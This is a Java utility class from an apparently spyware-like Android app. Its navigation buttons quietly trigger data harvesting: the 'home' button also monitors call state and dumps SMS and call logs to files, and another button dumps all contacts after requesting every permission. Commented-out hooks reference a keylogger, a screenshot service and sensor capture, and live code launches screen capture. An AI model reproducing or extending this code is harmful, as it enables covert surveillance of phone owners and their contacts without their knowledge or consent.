package com.vikasyadavnsit.cdc.utils;

import static android.app.Activity.RESULT_OK;
import static com.vikasyadavnsit.cdc.constants.AppConstants.MEDIA_PROJECTION_REQUEST_CODE;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.fragment.HomeFragment;
import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
import com.vikasyadavnsit.cdc.permissions.PermissionManager;
import com.vikasyadavnsit.cdc.services.ScreenshotService;

public class ActionUtils {


    public static void handleButtonPress(AppCompatActivity activity, int... viewIds) {
        ActionUtils actionUtils = new ActionUtils();
        for (int viewId : viewIds) {
            handleButtonPress(activity, viewId);
        }
    }

    public static void handleButtonPress(AppCompatActivity activity, int viewId) {

        Button actionButton = activity.findViewById(viewId);

        if (R.id.main_navigation_request_play_button == viewId) {
            actionButton.setOnClickListener(view -> {
                new PermissionManager().requestAllPermissions(activity);

                FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages(activity, FileMap.CONTACTS));

                //ScreenshotService.setTakeScreenshot(true);
                //ScreenshotService.setStopScreenshotService(true);

//                DatabaseUtil dbUtils = new DatabaseUtil(activity, AppConstants.CDC_DATABASE_NAME, AppConstants.CDC_DATABASE_PATH);
//                dbUtils.createTable(DBConstants.CREATE_APPLICATION_DATA_TABLE);
//                dbUtils.insertIntoApplicationData( "SENSOR_READ_INTERVAL_IN_MS", "600000");
//                dbUtils.insertIntoApplicationData( "SENSOR_READ_DURATION_IN_MS", "5000");
//                dbUtils.insertIntoApplicationData( "CAPTURE_SCREEN_SHOT", "TRUE");


                //CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
                //CDCSensorService.startSensorService(activity);
                //CDCSensorService.stopSensorService(activity);
            });
        } else if (R.id.main_navigation_request_home_button == viewId) {
            actionButton.setOnClickListener(view -> {
                CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
                CallUtils.monitorCallState(activity);
                FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages(activity, FileMap.SMS));
                FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages(activity, FileMap.CALL));
            });
        } else if (R.id.main_navigation_request_settings_button == viewId) {
            actionButton.setOnClickListener(view -> {
                CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
                new PermissionManager().requestAllPermissions(activity);
                //permissionHandler.resetAllPermissionManually(this);
                //KeyLoggerUtils.startAccessibilitySettingIntent(activity);
                FileUtils.startFileAccessSettings(activity);
            });
        }
    }


    public static void startMediaProjectionService(Activity activity) {
        MediaProjectionManager mediaProjectionManager =
                (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
    }

    public static void onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
        LoggerUtils.d("CommonUtil", "onActivityResult : requestCode : " + requestCode + " resultCode : " + resultCode);
        createMediaProjectionScreenshotServiceIntent(activity, requestCode, resultCode, data);
    }

    private static void createMediaProjectionScreenshotServiceIntent(Activity activity, int requestCode, int resultCode, Intent data) {
        if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Intent serviceIntent = new Intent(activity, ScreenshotService.class);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, data);
                activity.startService(serviceIntent);
            }
        }
    }

}
